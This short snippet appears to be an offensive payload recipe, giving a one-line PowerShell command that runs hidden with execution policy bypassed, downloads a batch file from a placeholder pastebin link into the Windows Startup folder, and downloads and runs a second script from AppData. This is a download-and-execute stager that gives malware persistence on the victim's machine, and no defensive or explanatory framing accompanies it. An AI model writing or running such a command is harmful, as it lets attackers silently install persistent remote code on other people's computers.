Save update.ps1 to $env:userprofile\AppData\Roaming then run the bat file


powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1""
